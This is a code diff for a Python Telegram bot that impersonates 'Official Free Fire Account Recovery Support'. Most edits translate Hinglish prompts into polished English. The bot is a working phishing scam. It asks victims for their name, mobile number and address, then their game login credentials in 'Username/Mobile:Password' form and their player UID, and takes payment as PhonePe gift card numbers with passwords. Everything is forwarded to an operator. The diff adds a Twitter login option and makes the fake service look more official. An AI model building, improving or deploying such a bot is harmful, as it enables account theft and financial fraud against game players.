@@ -46,7 +46,7 @@ def webhook():
 def index():
     return "FF Recovery Chat Bot is live and running 24/7!"
 
-# 1. /start command -> Welcome Banner + T&C + Agree Button
+# 1. /start command -> Welcome Banner + Terms & Conditions
 @bot.message_handler(commands=['start'])
 def start_command(message):
     chat_id = message.chat.id
@@ -57,8 +57,8 @@ def start_command(message):
     
     banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800"
     caption = (
-        "🛡️ **Welcome to Free Fire Official Recovery Support** 🛡️\n\n"
-        "Please read and agree to our **Terms & Conditions** before proceeding with your account recovery."
+        "🛡️ **Official Free Fire Account Recovery Support** 🛡️\n\n"
+        "Please review and agree to our **Terms & Conditions** to proceed with your secure account recovery process."
     )
     
     try:
@@ -66,7 +66,7 @@ def start_command(message):
     except Exception:
         bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
 
-# 2. T&C Agree -> Delete Banner & Show Service Selection
+# 2. T&C Agree -> Service Tier Selection
 @bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
 def agree_tc_callback(call):
     safe_answer(call.id)
@@ -85,7 +85,7 @@ def agree_tc_callback(call):
     
     bot.send_message(
         chat_id=chat_id,
-        text="🛠️ **What kind of service needed?**\n\nSelect your preferred recovery tier below:",
+        text="🛠️ **Select Recovery Service Tier**\n\nPlease choose your preferred recovery tier below:",
         parse_mode="Markdown",
         reply_markup=markup
     )
@@ -98,7 +98,7 @@ def plan_selection_callback(call):
     
     is_premium = (call.data == "plan_premium")
     plan_name = "Premium Recovery" if is_premium else "Basic Recovery"
-    duration = "24-48 Hours" if is_premium else "10-15 Days"
+    duration = "24 - 48 Hours" if is_premium else "10 - 15 Days"
     
     user_states[chat_id] = {"plan": plan_name, "is_premium": is_premium, "timestamp": time.time()}
     
@@ -108,12 +108,12 @@ def plan_selection_callback(call):
     bot.edit_message_text(
         chat_id=chat_id,
         message_id=call.message.message_id,
-        text=f"📋 **Selected Plan:** {plan_name}\n⏳ **Estimated Time:** `{duration}`\n\nClick confirm to view specific service sub-options.",
+        text=f"📋 **Selected Plan:** {plan_name}\n⏳ **Estimated Duration:** `{duration}`\n\nClick confirm to view available sub-options.",
         parse_mode="Markdown",
         reply_markup=markup
     )
 
-# 4. Sub-Options & Pricing Display (Mail Unlink vs Unlink + Relink)
+# 4. Sub-Options & Pricing Display
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
 def show_sub_options(call):
     safe_answer(call.id)
@@ -129,12 +129,12 @@ def show_sub_options(call):
         InlineKeyboardButton(f"🔗 Unlink + Relink ({p2_price})", callback_data=f"sub_relink_{'prem' if is_premium else 'basic'}")
     )
     
-    plan_text = "⭐ **Premium Plan Options**" if is_premium else "🟢 **Basic Plan Options**"
+    plan_text = "⭐ **Premium Plan Sub-Options**" if is_premium else "🟢 **Basic Plan Sub-Options**"
     
     bot.edit_message_text(
         chat_id=chat_id,
         message_id=call.message.message_id,
-        text=f"{plan_text}\n\nSelect the exact recovery sub-option you require:",
+        text=f"{plan_text}\n\nSelect the exact service requirement:",
         parse_mode="Markdown",
         reply_markup=markup
     )
@@ -161,7 +161,7 @@ def handle_sub_selection(call):
     
     bot.send_message(
         chat_id,
-        f"🎯 **Selected:** {service_name} (`₹{price}`)\n\nKripya apna poora **Name** enter karein:",
+        f"🎯 **Selected Service:** {service_name} (`₹{price}`)\n\nPlease enter your full **Name**:",
         parse_mode="Markdown"
     )
 
@@ -171,7 +171,7 @@ def collect_user_details(message):
     chat_id = message.chat.id
     
     if check_session_timeout(chat_id):
-        bot.send_message(chat_id, "⌛ Aapka session timeout ho gaya hai. Kripya `/start` dabakar dobara shuru karein.", parse_mode="Markdown")
+        bot.send_message(chat_id, "⌛ Your session has expired due to inactivity. Please send `/start` to begin again.", parse_mode="Markdown")
         return
         
     user_states[chat_id]["timestamp"] = time.time()
@@ -181,12 +181,12 @@ def collect_user_details(message):
     if state == "get_name":
         user_states[chat_id]["name"] = text
         user_states[chat_id]["step"] = "get_mobile"
-        bot.send_message(chat_id, "📱 Apne account ka **Mobile Number** enter karein:")
+        bot.send_message(chat_id, "📱 Please enter your valid **Mobile Number**:")
 
     elif state == "get_mobile":
         user_states[chat_id]["mobile"] = text
         user_states[chat_id]["step"] = "get_address"
-        bot.send_message(chat_id, "🏠 Apna current **Address (City / State)** enter karein:")
+        bot.send_message(chat_id, "🏠 Please enter your current **Address (City / State)**:")
 
     elif state == "get_address":
         user_states[chat_id]["address"] = text
@@ -195,10 +195,18 @@ def collect_user_details(message):
         markup = InlineKeyboardMarkup()
         markup.row(
             InlineKeyboardButton("Google", callback_data="login_Google"),
-            InlineKeyboardButton("Facebook", callback_data="login_Facebook"),
+            InlineKeyboardButton("Facebook", callback_data="login_Facebook")
+        )
+        markup.row(
+            InlineKeyboardButton("Twitter (X)", callback_data="login_Twitter"),
             InlineKeyboardButton("VK / Apple", callback_data="login_Other")
         )
-        bot.send_message(chat_id, "🔐 Account ka **Login Method** select karein:", reply_markup=markup)
+        bot.send_message(chat_id, "🔐 Please select your account **Login Method** using the buttons below:", reply_markup=markup)
+
+    elif state == "get_credentials":
+        user_states[chat_id]["credentials"] = text
+        user_states[chat_id]["step"] = "get_uid"
+        bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
 def handle_login_method(call):
@@ -206,13 +214,20 @@ def handle_login_method(call):
     chat_id = call.message.chat.id
     
     login_method = call.data.split("_")[1]
+    if login_method == "Other":
+        login_method = "VK / Apple"
+    elif login_method == "Twitter":
+        login_method = "Twitter (X)"
+        
     if chat_id in user_states:
         user_states[chat_id]["login_method"] = login_method
         user_states[chat_id]["step"] = "get_credentials"
         
         bot.send_message(
             chat_id,
-            "🔑 Ab apne login credentials bhejein:\nFormat: `Username/Mobile:Password` ek hi message mein enter karein.",
+            f"🔐 **Selected Login Method:** {login_method}\n\n"
+            "🔑 Please enter your login credentials in the following format:\n"
+            "`Username/Mobile:Password` (Send in a single message)",
             parse_mode="Markdown"
         )
 
@@ -221,7 +236,7 @@ def handle_credentials(message):
     chat_id = message.chat.id
     user_states[chat_id]["credentials"] = message.text.strip()
     user_states[chat_id]["step"] = "get_uid"
-    bot.send_message(chat_id, "🆔 Apna Free Fire **UID (Player ID)** enter karein:")
+    bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")
 
 @bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_uid")
 def handle_uid(message):
@@ -232,7 +247,7 @@ def handle_uid(message):
     data = user_states[chat_id]
     
     summary_text = (
-        "📋 **Review Your Details:**\n\n"
+        "📋 **Review Your Application Details:**\n\n"
         f"👤 **Name:** {data.get('name')}\n"
         f"📱 **Mobile:** {data.get('mobile')}\n"
         f"🏠 **Address:** {data.get('address')}\n"
@@ -240,12 +255,12 @@ def handle_uid(message):
         f"🔑 **Credentials:** `{data.get('credentials')}`\n"
         f"🆔 **UID:** `{data.get('uid')}`\n"
         f"🛠️ **Service:** {data.get('sub_option')}\n"
-        f"💰 **Amount:** ₹{data.get('price')}\n\n"
-        "⚠️ *All details given above is correct.*"
+        f"💰 **Total Amount:** ₹{data.get('price')}\n\n"
+        "⚠️ *Please verify all details are correct before proceeding.*"
     )
     
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("✅ Details Correct - Proceed to Payment", callback_data="proceed_payment"))
+    markup.add(InlineKeyboardButton("✅ Confirm Details & Proceed to Payment", callback_data="proceed_payment"))
     
     bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)
 
@@ -259,10 +274,11 @@ def proceed_to_payment(call):
     user_states[chat_id]["step"] = "get_gift_card"
     
     payment_prompt = (
-        f"💳 **PHONEPE GIFT CARD PAYMENT** 💳\n\n"
-        f"Total Amount Payable: **₹{price}**\n\n"
-        "Kripya PhonePe Gift Card ke zariye payment karein aur niche diye gaye format mein details bhejein:\n\n"
-        "Format: `GiftCardNumber:Password`"
+        f"💳 **SECURE PHONEPE GIFT CARD PAYMENT** 💳\n\n"
+        f"Amount Payable: **₹{price}**\n\n"
+        "Please complete the payment via PhonePe Gift Card and send your details in the exact format below:\n\n"
+        "Format: `GiftCardNumber:Password`\n"
+        "*(Example: `9876543210123456:abcd1234`)*"
     )
     bot.send_message(chat_id, payment_prompt, parse_mode="Markdown")
 
@@ -273,7 +289,11 @@ def handle_gift_card(message):
     
     # Anti-Fraud Format Validation
     if ":" not in gift_card_input or len(gift_card_input) < 10:
-        bot.send_message(chat_id, "❌ **Invalid Format!** Kripya sahi format mein enter karein:\n`GiftCardNumber:Password`", parse_mode="Markdown")
+        bot.send_message(
+            chat_id, 
+            "❌ **Invalid Format!** Please provide your gift card details in the correct format:\n`GiftCardNumber:Password`", 
+            parse_mode="Markdown"
+        )
         return
 
     gc_parts = gift_card_input.split(":", 1)
@@ -281,7 +301,7 @@ def handle_gift_card(message):
     gc_pass = gc_parts[1].strip()
 
     if not gc_number.isdigit() or len(gc_number) < 12:
-        bot.send_message(chat_id, "❌ **Verification Failed:** Gift Card number अमान्य (invalid) lag raha hai.", parse_mode="Markdown")
+        bot.send_message(chat_id, "❌ **Verification Failed:** The provided Gift Card number appears to be invalid. Please check and re-enter.", parse_mode="Markdown")
         return
 
     user_states[chat_id]["gift_card_no"] = gc_number
@@ -291,12 +311,12 @@ def handle_gift_card(message):
     data = user_states[chat_id]
     username = message.from_user.username or message.from_user.first_name
     
-    bot.send_message(chat_id, "⏳ **Details is under verification please wait till confirmation.**", parse_mode="Markdown")
+    bot.send_message(chat_id, "⏳ **Your details are under verification. Please wait for confirmation.**", parse_mode="Markdown")
     
     # Admin Split Notifications (2 Messages)
     msg_basic_details = (
         f"🚨 **New Recovery Request (Basic Info)**\n\n"
-        f"🎟️ **Ticket:** `{ticket_id}`\n"
+        f"🎟️ **Ticket ID:** `{ticket_id}`\n"
         f"👤 **User:** @{username} (`{chat_id}`)\n"
         f"📛 **Name:** {data.get('name')}\n"
         f"📱 **Mobile:** {data.get('mobile')}\n"
@@ -314,7 +334,7 @@ def handle_gift_card(message):
     
     msg_payment_details = (
         f"💳 **New Payment Verification (Gift Card)**\n\n"
-        f"🎟️ **Ticket:** `{ticket_id}`\n"
+        f"🎟️ **Ticket ID:** `{ticket_id}`\n"
         f"💰 **Amount:** ₹{data.get('price')}\n"
         f"🎁 **Gift Card No:** `{gc_number}`\n"
         f"🔒 **Password:** `{gc_pass}`"
@@ -338,17 +358,17 @@ def handle_admin_payment_action(call):
     if action == "recv":
         bot.send_message(
             target_chat_id, 
-            "✅ Your payment is successfully received. Your mail Unlink as soon as possible when your mail is Unlink we will inform you . Have a Good Day.", 
+            "✅ Your payment has been successfully verified and received. Your account unlinking process has started, and we will notify you once completed. Have a wonderful day!", 
             parse_mode="Markdown"
         )
-        bot.edit_message_text(f"✅ Payment Received & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"✅ Payment Verified & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
     else:
         bot.send_message(
             target_chat_id, 
-            "❌ Aapka PhonePe Gift Card verification fail ho gaya hai ya payment match nahi hui hai. Kripya apne gift card details check karke dobara `/start` se submit karein.", 
+            "❌ Your PhonePe Gift Card verification failed or the payment could not be validated. Please verify your gift card details and restart the process using `/start`.", 
             parse_mode="Markdown"
         )
-        bot.edit_message_text(f"❌ Payment Not Received / Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"❌ Payment Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
